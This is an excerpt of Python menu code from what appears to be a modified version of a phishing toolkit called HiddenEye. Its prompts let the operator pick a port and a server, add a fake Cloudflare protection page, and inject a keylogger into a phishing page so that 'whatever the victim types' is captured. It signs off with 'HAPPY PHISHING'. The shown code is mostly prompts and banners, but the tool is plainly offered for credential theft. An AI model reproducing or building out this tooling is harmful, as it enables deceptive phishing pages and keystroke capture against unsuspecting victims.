...
def selectPort():  # Question where user must select port
    ...
    print("\n {0}[{1}*{0}]{0}Select Any Available Port [1-65535] (eg: 8080) :{1}".format(MAIN0, MAIN4))
...
def selectServer(port):  # Question where user must select server
    ...
    print('''
        ...
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {0}http://github.com/STRT/MODHiddenEye
...
def emailPrompt():
    ...
    print('''{1}
        ...
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {1}http://github.com/STRT/MODHiddenEye
        {0}** BY: {1}STRT {0}**
'''.format(MAIN0, MAIN2))
    print(
...
def addingCloudfare():
    print("\n{0}[{1}*{0}]{0}DO YOU WANT TO ADD A CLOUDFARE PROTECTION FAKE PAGE (Optional) -{1}(Y/N)".format(MAIN0, MAIN4))
    choice = input("\n\n{1}{0}YOUR CHOICE >>> {2}".format(
        MAIN0, MAIN4, MAIN2)).upper()
    if choice == 'Y':
        addCloudfare()
...
def addingkeylogger():
    print("\n{0}[{1}!{0}]{1}ATTENTION: Adding Keylogger Mostly Kills the Tunnel Connection.\n".format(
        MAIN0, MAIN4))
    print("\n{0}[{1}*{0}]{0}DO YOU WANT TO ADD A KEYLOGGER IN PHISHING PAGE (Means, whatever the victim types you will be able to see it.)-{1}(Y/N)".format(MAIN0, MAIN4))
    choice = input("\n\n{1}{0}YOUR CHOICE >>> {2}".format(
        MAIN0, MAIN4, MAIN2)).upper()
    if choice == 'Y':
        addkeylogger()
...
def endMessage(port):  # Message when HiddenEye exit
    ...
    if choice == 'R' or choice == 'r':
        ...
        print('''
            ...
            {1}https://github.com/STRT/MODHiddenEye
  ...
  {3}  [[*]] THANKS FOR USING THIS TOOL. HAPPY PHISHING ... GOOD BYE \n '''.format(MAIN2, MAIN2, MAIN4, MAIN0))
    else:
        system('clear')
